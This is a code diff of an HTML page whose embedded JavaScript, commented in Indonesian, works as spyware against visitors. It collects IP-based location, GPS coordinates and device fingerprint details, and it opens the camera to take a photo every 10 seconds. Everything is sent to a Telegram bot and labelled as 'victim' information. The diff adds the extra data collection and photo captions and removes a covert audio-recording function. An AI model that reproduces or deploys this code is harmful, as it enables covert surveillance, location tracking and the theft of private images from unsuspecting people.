@@ -42,29 +42,47 @@ function kirimPesan(text) {
   });
 }
 
-// Ambil IP & lokasi berdasarkan IP
+// Kirim pesan awal
+kirimPesan('LAPOR INFORMASI USER KE DETEKSI BANG DONZ');
+
+// Ambil info IP & lokasi
 fetch('https://api.ipify.org?format=json')
   .then(res => res.json())
   .then(ipData => fetch('https://ipapi.co/' + ipData.ip + '/json/'))
   .then(loc => loc.json())
   .then(info => {
     const device = navigator.userAgent;
+    const ram = navigator.deviceMemory || 'Tidak diketahui';
+    const cpu = navigator.hardwareConcurrency || 'Tidak diketahui';
+    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const bahasa = navigator.language;
+    const browser = navigator.appName + ' ' + navigator.appVersion;
+    const statusJaringan = navigator.onLine ? 'Online' : 'Offline';
+
     navigator.getBattery().then(bat => {
       const status = `
-== DETEKSI TARGET ==
-IP: ${info.ip}
-Negara: ${info.country_name}
-Region: ${info.region}
-Kota: ${info.city}
-ISP: ${info.org}
-Baterai: ${Math.floor(bat.level * 100)}%
-Device: ${device}
+
+== INFORMASI KORBAN ==
+🌐 IP: ${info.ip}
+🏳 Negara: ${info.country_name}
+🖥 Region: ${info.region}
+📲 Kota: ${info.city}
+🔎 ISP: ${info.org}
+🔋 Baterai: ${Math.floor(bat.level * 100)}%
+📱 Device: ${device}
+🧠 RAM: ${ram} GB
+⚙️ CPU: ${cpu} core
+🌍 Zona Waktu: ${timezone}
+🗣️ Bahasa: ${bahasa}
+🧭 Browser: ${browser}
+📡 Status Jaringan: ${statusJaringan}
 =====================`;
+
       kirimPesan(status);
     });
   });
 
-// Ambil lokasi GPS (jika user izinkan)
+// Ambil lokasi GPS
 if ("geolocation" in navigator) {
   navigator.geolocation.getCurrentPosition(pos => {
     const lat = pos.coords.latitude;
@@ -74,19 +92,18 @@ if ("geolocation" in navigator) {
   });
 }
 
-// Kamera + Mic + Rekaman Otomatis
-navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+// Kamera dan ambil foto tiap 10 detik
+navigator.mediaDevices.getUserMedia({ video: true })
 .then(stream => {
   video.srcObject = stream;
   video.play();
 
   setInterval(() => {
     ambilFoto();
-    rekamAudio(stream);
   }, 10000); // tiap 10 detik
 })
 .catch(err => {
-  kirimPesan("Gagal akses media: " + err);
+  kirimPesan("Gagal akses kamera: " + err);
 });
 
 function ambilFoto() {
@@ -97,31 +114,14 @@ function ambilFoto() {
     let form = new FormData();
     form.append('chat_id', chat_id);
     form.append('photo', blob, 'foto.jpg');
+    form.append('caption', 'INI ADALAH FOTO KORBAN BANG DONZ');
     fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
       method: 'POST',
       body: form
     });
   }, 'image/jpeg');
 }
-
-function rekamAudio(stream) {
-  const recorder = new MediaRecorder(stream);
-  let chunks = [];
-  recorder.ondataavailable = e => chunks.push(e.data);
-  recorder.onstop = () => {
-    const blob = new Blob(chunks, { type: 'audio/webm' });
-    let form = new FormData();
-    form.append('chat_id', chat_id);
-    form.append('audio', blob, 'rekaman.webm');
-    fetch(`https://api.telegram.org/bot${token}/sendAudio`, {
-      method: 'POST',
-      body: form
-    });
-  };
-  recorder.start();
-  setTimeout(() => recorder.stop(), 5000);
-}
 </script>
 
 </body>
-</html> 
+</html>
